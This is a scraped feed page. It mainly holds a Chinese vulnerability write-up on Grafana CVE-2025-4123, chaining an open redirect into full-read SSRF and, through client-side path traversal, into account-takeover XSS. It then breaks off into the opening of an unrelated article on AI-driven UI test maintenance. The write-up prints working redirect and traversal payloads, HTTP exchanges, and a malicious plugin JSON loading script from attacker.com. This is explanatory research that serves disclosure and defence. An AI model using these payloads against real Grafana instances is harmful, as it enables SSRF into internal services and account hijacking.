ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Grafana CVE-2025-4123：全读SSRF与账户接管</h2>
<p><strong>摘要</strong></p>
<p>当Web应用程序接收一个URL参数，并在未经验证的情况下将用户重定向到该指定URL时，就会发生开放重定向。</p>
<pre><code class="hljs language-bash" lang="bash">/redirect?url=https://evil.com --&gt; (302 重定向) --&gt; https://evil.com
</code></pre>
<p>这本身看起来可能并不危险，但此类漏洞是发现两个独立漏洞的起点：一个全读SSRF和一个账户接管漏洞。</p>
<p>在这篇文章中，我将逐步详细介绍发现它们的完整过程。</p>
<h4 data-id="heading-1">为什么选择Grafana？</h4>
<p>Grafana是一个开源分析平台，主要使用Go和TypeScript构建，用于可视化来自Prometheus和InfluxDB等来源的数据。</p>
<p>我认为在这个Web应用程序中寻找漏洞将是一个很好的挑战，因此我下载了源代码并开始调试——尽管这是我第一次使用Go。我决定专注于应用程序的未认证部分。</p>
<h4 data-id="heading-2">入口点：开放重定向</h4>
<p>我查看了 <code>api/api.go</code> 中定义的所有未认证端点...</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 未登录视图</span>
<span class="hljs-selector-tag">r</span><span class="hljs-selector-class">.Get</span>(<span class="hljs-string">"/logout"</span>, hs.Logout)
<span class="hljs-selector-tag">r</span><span class="hljs-selector-class">.Post</span>(<span class="hljs-string">"/login"</span>, requestmeta.<span class="hljs-built_in">SetOwner</span>(requestmeta.TeamAuth), <span class="hljs-built_in">quota</span>(string...
r.<span class="hljs-built_in">Get</span>(<span class="hljs-string">"/login/:name"</span>, <span class="hljs-built_in">quota</span>(<span class="hljs-built_in">string</span>(auth.QuotaTargetSrv)), hs.OAuthLogin)
r.<span class="hljs-built_in">Get</span>(<span class="hljs-string">"/login"</span>, hs.LoginView)
r.<span class="hljs-built_in">Get</span>(<span class="hljs-string">""</span>, hs.Index)

<span class="hljs-comment">// 已认证视图</span>
r.<span class="hljs-built_in">Get</span>(<span class="hljs-string">"/"</span>, reqSignedIn, hs.Index)
r.<span class="hljs-built_in">Get</span>(<span class="hljs-string">"/profile/"</span>, reqSignedInNoAnonymous, hs.Index)
...
</code></pre>
<h4 data-id="heading-3">功能分析</h4>
<p>我甚至深入挖掘以检查应用程序中使用的中间件。就在这时，我遇到了一个负责处理静态路由的函数——它引起了我的注意。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">staticHandler</span><span class="hljs-params">(ctx *web.Context, log log.Logger, opt StaticOptions)</span></span> <span class="hljs-type">bool</span> {
    <span class="hljs-keyword">if</span> ctx.Req.Method != <span class="hljs-string">"GET"</span> &amp;&amp; ctx.Req.Method != <span class="hljs-string">"HEAD"</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
    }
    file := ctx.Req.URL.Path
    <span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> opt.Exclude {
        <span class="hljs-keyword">if</span> file == p {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
        }
    }
    <span class="hljs-comment">// 如果有前缀，则通过剥离前缀来过滤请求</span>
    <span class="hljs-keyword">if</span> opt.Prefix != <span class="hljs-string">""</span> {
        <span class="hljs-keyword">if</span> !strings.HasPrefix(file, opt.Prefix) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
        }
        file = file[<span class="hljs-built_in">len</span>(opt.Prefix):]
        <span class="hljs-keyword">if</span> file != <span class="hljs-string">""</span> &amp;&amp; file[<span class="hljs-number">0</span>] != <span class="hljs-string">'/'</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
        }
    }
    f, err := opt.FileSystem.Open(file)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
    }
    ..............
}
</code></pre>
<p>该函数用于根据用户输入从系统中检索文件。自然地，我的第一个想法是尝试使用像 <code>../</code> 这样的路径遍历技术加载任意文件。</p>
<p>我将向你解释所有代码和现有净化措施的流程（理解漏洞很重要）：</p>
<p>因此，如果你请求 <code>/public/file/../../../name</code>，路径会被净化并解析为 <code>/staticfiles/etc/etc/name</code>，从而有效地阻止了对目标目录之外非预期文件的访问。</p>
<p>此外，如果解析后的最终路径指向一个文件夹，<code>StaticHandler</code> 函数会检查其中的默认文件——通常从该目录提供 <code>/index.html</code>。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">if</span> fi.IsDir() {
    <span class="hljs-comment">// 如果缺少尾部斜杠，则重定向。</span>
    <span class="hljs-keyword">if</span> !strings.HasSuffix(ctx.Req.URL.Path, <span class="hljs-string">"/"</span>) {
        path := fmt.Sprintf(<span class="hljs-string">"%s/"</span>, ctx.Req.URL.Path)
        <span class="hljs-keyword">if</span> !strings.HasPrefix(path, <span class="hljs-string">"/"</span>) {
            <span class="hljs-comment">// 澄清这是一个相对于此服务器的路径</span>
            path = fmt.Sprintf(<span class="hljs-string">"/%s"</span>, path)
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 以 // 或 /\ 开头的字符串会被浏览器解释为URL，而不是服务器相对路径</span>
            rePrefix := regexp.MustCompile(<span class="hljs-string">`^(?:/\\|/+)`</span>)
            path = rePrefix.ReplaceAllString(path, <span class="hljs-string">"/"</span>)
        }
        http.Redirect(ctx.Resp, ctx.Req, path, http.StatusFound)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
    }
    file = path.Join(file, opt.IndexFile)
    indexFile, err := opt.FileSystem.Open(file)
    ....
}
</code></pre>
<p>正如你所看到的，如果最终文件是一个目录，并且提供的路由（例如 <code>/public/build</code>）不是以 <code>/</code> 结尾，服务器会重定向到附加了尾部 <code>/</code> 的相同路径。</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">GET</span> /<span class="hljs-keyword">public</span>/build HTTP/<span class="hljs-number">1.1</span>
<span class="hljs-symbol">Host:</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">100.2</span>:<span class="hljs-number">3000</span>

HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">302</span> Found
<span class="hljs-symbol">Location:</span> /<span class="hljs-keyword">public</span>/build/
</code></pre>
<p>这种重定向行为正是开放重定向漏洞发生的地方，所以接下来让我们深入探讨。</p>
<h4 data-id="heading-4">目标</h4>
<p>我有一个场景，应用程序根据提供的路由进行重定向，因此最终的重定向URL将始终以 <code>/</code> 开头。我的目标是创建一个路由，当被请求时，重定向到一个有效的完整URL，并且该URL也以 <code>/</code> 开头，例如：</p>
<pre><code class="hljs language-bash" lang="bash">//attacker.com/...    --&gt; `//` 表示协议相对URL，使用与当前页面相同的协议（HTTPS）
/\attacker.com/...     --&gt; `/\` 做同样的事情
</code></pre>
<h4 data-id="heading-5">问题与解决方案</h4>
<p><strong>有效的目录</strong></p>
<p>为了触发重定向功能，我需要一个以 <code>/public/</code> 开头的路由，并且当传递给 <code>opt.FileSystem.Open(file)</code> 时，该路由能解析为一个有效的目录。</p>
<p>我从 <code>/public/\attacker.com/../..</code> 开始，它解析为空字符串 <code>""</code>，然后附加到 <code>/staticfiles/etc/etc/</code>，触发 <code>if fi.isDir(){}</code> 代码流。</p>
<pre><code class="hljs language-typescript" lang="typescript">/<span class="hljs-keyword">public</span>/\attacker.<span class="hljs-property">com</span>/../.. --&gt; <span class="hljs-regexp">/\attacker.com/</span>../.. --&gt; <span class="hljs-string">""</span> --&gt; <span class="hljs-regexp">/staticfiles/</span>etc/etc/ + <span class="hljs-string">""</span> --&gt; fi.<span class="hljs-title function_">isDir</span>() <span class="hljs-variable constant_">TRUE</span>
</code></pre>
<p>现在，我有了一种方法，可以注入任何将被 <code>opt.FileSystem.Open(file)</code> 解释为文件夹的有效载荷。</p>
<pre><code class="hljs language-bash" lang="bash">/public/{}/../..
</code></pre>
<p><strong>不一致性</strong></p>
<p>一旦进入 <code>isDir()</code> 部分，<code>/public/\attacker.com/../..</code> 路径就到达了 <code>http.Redirect()</code> 函数。问题是这个函数也会解析路径，导致重定向路径变为 <code>/</code>。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">if</span> fi.IsDir() {
    ...
    <span class="hljs-comment">// path 是 "/public/\attacker.com/../.." 但最终重定向是 "/"</span>
    http.Redirect(ctx.Resp, ctx.Req, path, http.StatusFound)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
    ...
}
</code></pre>
<p>如果我请求 <code>/public/\attacker.com/../..</code></p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">GET</span> /<span class="hljs-keyword">public</span>/\attacker.com/../.. HTTP/<span class="hljs-number">1.1</span>
<span class="hljs-symbol">Host:</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">100.2</span>:<span class="hljs-number">3000</span>

HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">302</span> Found
<span class="hljs-symbol">Location:</span> /
</code></pre>
<p>所以，基本上，<strong>我需要创建一个路由，其中 <code>/../..</code> 在加载文件时被 <code>opt.FileSystem.Open(file)</code> 解析，但在执行重定向时 <code>http.Redirect()</code> 中不被解析。</strong></p>
<p>路径在每种情况下被解析的方式不同。</p>
<ul>
<li><code>opt.FileSystem.Open(file)</code> 期望一个系统文件路径。</li>
<li><code>http.Redirect(path)</code> 期望一个URL路径。</li>
</ul>
<p>问题就是答案？</p>
<ul>
<li><code>opt.FileSystem.Open(file)</code> 将 <code>?</code> 视为普通字符。</li>
<li><code>http.Redirect(path)</code> 将 <code>?</code> 解释为URL参数的开始。</li>
</ul>
<p>这意味着 <code>/public/\attacker.com/?/../../../..</code> 将这样被处理：</p>
<p>在 <code>opt.FileSystem.Open()</code> 中 --&gt; <code>/public/\attacker.com/?/../../../..</code> 解析为 <code>""</code> --&gt; <code>/staticfiles/etc/etc/</code> + <code>""</code> 是一个有效的文件夹。</p>
<p>在 <code>http.Redirect()</code> 中 → <code>/public/\attacker.com/?/../../../..</code> --&gt; <code>?</code> 之后的任何内容都被视为查询字符串，不作为路径的一部分进行解析。</p>
<p>使用 <code>?</code> -&gt; <code>%3f</code> 进行请求：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-variable constant_">GET</span> /<span class="hljs-keyword">public</span>/\attacker.<span class="hljs-property">com</span>/%3f/../.. <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span>
<span class="hljs-title class_">Host</span>: <span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.2</span>:<span class="hljs-number">3000</span>

<span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">302</span> <span class="hljs-title class_">Found</span>
<span class="hljs-title class_">Location</span>: <span class="hljs-regexp">/public/</span>\attacker.<span class="hljs-property">com</span>/?<span class="hljs-regexp">/../</span>..
</code></pre>
<p><strong>最终有效载荷</strong></p>
<p>URL <code>/public/\attacker.com/?/../../../..</code> 需要被解析为一个以 <code>/\</code> 开头的完整URL。</p>
<p>我简单地使用了这个路径：<code>/public/../\attacker.com/?/../../../..</code></p>
<p>当 http.Redirect() 解析路径时，它会移除 <code>/public</code> 部分。</p>
<p>请求：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-variable constant_">GET</span> /<span class="hljs-keyword">public</span>/../\attacker.<span class="hljs-property">com</span>/%3f/../../../../../.. <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span>
<span class="hljs-title class_">Host</span>: <span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.2</span>:<span class="hljs-number">3000</span>

<span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">302</span> <span class="hljs-title class_">Found</span>
<span class="hljs-title class_">Location</span>: <span class="hljs-regexp">/\attacker.com/</span>?<span class="hljs-regexp">/../</span>../../../../..
</code></pre>
<h4 data-id="heading-6">全读SSRF</h4>
<p>那个开放重定向本身并没有严重的安全影响，所以我需要将其与另一个功能链接起来。</p>
<p>Grafana有一个名为 <code>/render</code> 的端点，用于根据提供的路径生成图像。</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// 渲染</span>
<span class="hljs-selector-tag">r</span><span class="hljs-selector-class">.Get</span>(<span class="hljs-string">"/render/*"</span>, requestmeta.<span class="hljs-built_in">SetSLOGroup</span>(requestmeta.SLOGroupHighSlow), reqSignedIn, hs.RenderHandler)
</code></pre>
<p>此端点使用无头浏览器来渲染用户指定的路由的HTML，它只接受相对URL路径 <code>/route</code>，不允许从绝对URL <code>https://....</code> 渲染内容。</p>
<p>但是，如果我使用我发现的开放重定向来重定向到内部服务呢？</p>
<p>首先，我尝试加载 <code>google.es</code> 使用 <code>/render/public/..%252f%255Cgoogle.es%252f%253F%252f..%252f..</code></p>
<p>然后我设置了一个外部无法访问的内部服务。</p>
<p>我尝试加载 <code>127.0.0.1:1234</code> 使用 <code>/render/public/..%252f%255C127.0.0.1:1234%252f%253F%252f..%252f..</code></p>
<p>利用这个漏洞，我能够完全读取内部服务。由于使用了浏览器进行渲染，我甚至可以通过制作一个针对内部服务的表单来发送 <code>POST</code> 请求。</p>
<p>Grafana在Intigriti上的公开漏洞赏金计划不包括 <code>/render</code> 端点，因为它默认未启用。此外，这个漏洞需要登录，所以我无法从中获得任何好处。</p>
<h4 data-id="heading-7">通过XSS进行账户接管</h4>
<p>这可能是我为实现XSS和账户接管所利用过的最好的漏洞链。</p>
<p><strong>客户端路径遍历</strong></p>
<p>Grafana客户端代码的一个重要部分允许客户端路径遍历。</p>
<p>例如，当你在浏览器中加载 <code>/invite/1</code> 时，JavaScript会向 <code>/api/user/invite/1</code> 发出请求以获取邀请信息。</p>
<p>但是，如果你加载 <code>/invite/..%2f..%2f..%2f..%2froute</code>，JavaScript会解析路径遍历并最终加载 <code>/route</code>。</p>
<p>这创建了一个完美的场景，可以强制JavaScript加载开放重定向，进而从我的服务器获取一个特制的JSON。</p>
<p>但首先，我需要找到一个以不安全方式加载内容的端点，并利用它来执行JavaScript。</p>
<p><strong>加载恶意JavaScript文件</strong></p>
<p>你可以使用 <code>/a/plugin-app/explore</code> 来加载和管理插件应用。</p>
<p>此功能的JavaScript从URL中提取插件应用名称，并用它向 <code>/api/plugins/plugin-app/settings</code> 请求插件信息。</p>
<p><code>/api/plugins/plugin-app/settings</code> 文件看起来像这样。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"plugin-app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"plugin-app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"pinned"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"autoEnabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/modules/..../plugin-app.js"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 要加载的js文件</span>
  <span class="hljs-attr">"baseUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"public/plugins/grafana-lokiexplore-app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"info"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"author"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Grafana"</span>
      ...
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
  ...
<span class="hljs-punctuation">}</span>
</code></pre>
<p><code>/a/plugin-app/explore</code> 加载该文件，并执行 <code>"module"</code> 参数中提供的JavaScript。</p>
<p><code>/a/plugin-app/explore</code> 存在客户端路径遍历漏洞，这允许我加载服务器上的任何路由，而不是 <code>/api/plugin-app/settings</code>。</p>
<p>这让我可以加载开放重定向，从而获取我自己的恶意JSON，其中包含我想要的任何JavaScript文件。</p>
<p>所以，基本上，我设置了自己的服务器，包含所有必要的JS和JSON文件。我只需要托管一个像这样的JSON：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ExploitPluginReq"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"grafana-lokiexplore-app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"pinned"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"autoEnabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://attacker.com/file?js=file"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 恶意js文件</span>
  <span class="hljs-attr">"baseUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"public/plugins/grafana-lokiexplore-app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"info"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"author"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      ...
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
  ...
<span class="hljs-punctuation">}</span>
</code></pre>
<p>并加载这个路由：<code>/a/..%2f..%2f..%2fpublic%2f..%252f%255Cattacker.com%252f%253Fp%252f..%252f..%23/explore</code>，它利用了客户端路径遍历和开放重定向。</p>
<p>结果：</p>
<p>我的恶意JavaScript文件被执行，允许我更改受害者的电子邮件并重置他们的密码。</p>
<h4 data-id="heading-8">完整漏洞利用</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FNightBloodz%2FCVE-2025-4123" target="_blank" title="https://github.com/NightBloodz/CVE-2025-4123" ref="nofollow noopener noreferrer">github.com/NightBloodz…</a></p>
<p>我一直认为Grafana是一个不可能被入侵的目标。它看起来如此复杂和安全——公平地说，它确实如此。</p>
<p>但发现这个漏洞证明，无论一个应用程序看起来多么安全，它总是有或者最终会有漏洞。</p>
<p>我无法通过向多个漏洞赏金计划报告来进一步升级这个漏洞，因为这两个利用路径都需要认证。FINISHED
CSD0tFqvECLokhw9aBeRqvKIIiRnkL9yIza9szHEGEsgJQ2u/pg4kqWzexgckcGuCZ4G+G/isppsz+vpquPYF9IWRUby7c15zOEBYpQSS2FBudsxgaVCbpDSoPJQROt4Wjd1DExefN9AONM7bYep3g==</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[货拉拉UI自动化新范式：从人工维护到AI自愈]]></title>    <link>https://juejin.cn/post/7602472997921505280</link>    <guid>https://juejin.cn/post/7602472997921505280</guid>    <pubDate>2026-02-04T01:58:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602472997921505280" data-draft-id="7602146335216615464" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="货拉拉UI自动化新范式：从人工维护到AI自愈"/> <meta itemprop="keywords" content="测试"/> <meta itemprop="datePublished" content="2026-02-04T01:58:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="货拉拉技术"/> <meta itemprop="url" content="https://juejin.cn/user/1768489241815070"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            货拉拉UI自动化新范式：从人工维护到AI自愈
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1768489241815070/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    货拉拉技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T01:58:31.000Z" title="Wed Feb 04 2026 01:58:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>作者介绍：胡嘉椿，来自货拉拉/技术中心/质量保障部，专注于移动测试效能方向。</p>
</blockquote>
<h2 data-id="heading-0">一、背景与挑战</h2>
<p>在移动端测试中，我们始终面对着同一个核心挑战：<strong>如何持续降低手工测试的工作量？</strong> 为此，我们团队已经建立起两条成熟的创新提效路径：</p>
<ol>
<li><strong>在老功能回归测试上</strong>，我们以<strong>UI录制回放（参考《</strong> <strong><a href="https://juejin.cn/post/7306331307477794867" target="_blank" title="https://juejin.cn/post/7306331307477794867">货拉拉App录制回放的探索与实践</a></strong> <strong>》）</strong> 技术，颠覆了传统手写脚本模式，实现了脚本的“<strong>零代码”</strong> 生成与大规模覆盖，从根本上解决了自动化普及的瓶颈。</li>
<li><strong>在新功能测试上</strong>，我们推出了<strong>多机同步模式（参考《</strong> <strong><a href="https://juejin.cn/post/7430902939316109312" target="_blank" title="https://juejin.cn/post/7430902939316109312">货拉拉云真机多机同步探索与实践</a></strong> <strong>》）</strong> ，绕开了传统脚本的局限，实现了“一端操作、多端覆盖”，缓解了多机型、多端口的效率瓶颈问题。</li>
</ol>
<p>基于这些创新实践，为我们构建了货拉拉移动端测试的提效体系。然而，效率提升的红利正逐渐触达瓶颈，而且也有新的挑战：</p>
<ul>
<li><strong>自动化测试，仍需要“人工维护”</strong> ：随着脚本规模超过18,000条，App UI频繁迭代带来的脚本失效问题，使我们陷入了新的“脚本修复”循环。</li>
